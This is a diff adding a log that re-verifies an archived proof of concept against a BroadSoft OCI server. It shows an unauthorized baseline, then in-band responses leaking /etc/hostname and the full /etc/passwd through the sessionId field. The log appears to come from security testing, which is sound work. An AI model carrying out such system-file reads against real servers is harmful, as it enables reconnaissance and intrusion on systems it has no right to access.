@@ -1,0 +1,69 @@
+### re-verification of archived PoC  2026-09-15T16:19:21+08:00
+### T1 baseline (plain) 2208
+=== mode=plain target=192.168.188.x:2208 tls=False len=312 ===
+[bytes] 410
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">probesess0001</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
+### T6 in-band /etc/hostname 2208
+=== mode=band target=192.168.188.x:2208 tls=False len=381 ===
+[bytes] 413
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">202606.bwas.com
+</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
+### T7 in-band /etc/passwd 2208
+=== mode=bandp target=192.168.188.x:2208 tls=False len=381 ===
+[bytes] 2521
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:998:998:User for polkitd:/:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/:/sbin/nologin
+pipewire:x:997:996:PipeWire System Daemon:/run/pipewire:/usr/sbin/nologin
+sssd:x:996:995:User for sssd:/:/sbin/nologin
+geoclue:x:995:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
+colord:x:994:993:User for colord:/var/lib/colord:/sbin/nologin
+clevis:x:993:992:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin
+flatpak:x:992:991:Flatpak system helper:/:/usr/sbin/nologin
+libstoragemgmt:x:990:990:daemon account for libstoragemgmt:/:/usr/sbin/nologin
+setroubleshoot:x:989:989:SELinux troubleshoot server:/var/lib/setroubleshoot:/usr/sbin/nologin
+gdm:x:42:42:GNOME Display Manager:/var/lib/gdm:/usr/sbin/nologin
+gnome-initial-setup:x:988:987::/run/gnome-initial-setup/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
+chrony:x:987:986:chrony system user:/var/lib/chrony:/sbin/nologin
+dnsmasq:x:986:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/usr/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+leo:x:1000:1000:leo:/home/leo:/bin/bash
+bwadmin:x:1001:1001:BWORKS user:/export/home/bwadmin:/bin/bash
+bworks:x:1002:1001:bworks privsep:/var/empty/bworks:/bin/false
+lmadmin:x:1003:1001:lmadmin privsep:/var/empty/lmadmin:/bin/false
+ttadmin:x:1004:1001::/home/ttadmin:/bin/bash
+</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
+### T9 in-band /etc/hostname 2209 TLS
+=== mode=band target=192.168.188.x:2209 tls=True len=381 ===
+[bytes] 413
+[response-begin]
+<?xml version="1.0" encoding="UTF-8"?><BroadsoftDocument xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" protocol="OCI"><sessionId xmlns="">202606.bwas.com
+</sessionId><command xmlns="" xmlns:c="C" type="Error" xsi:type="c:ErrorResponse"><summary>[Error 5404] Unauthorized transaction.</summary><summaryEnglish>[Error 5404] Unauthorized transaction.</summaryEnglish></command></BroadsoftDocument>
+
+[response-end]
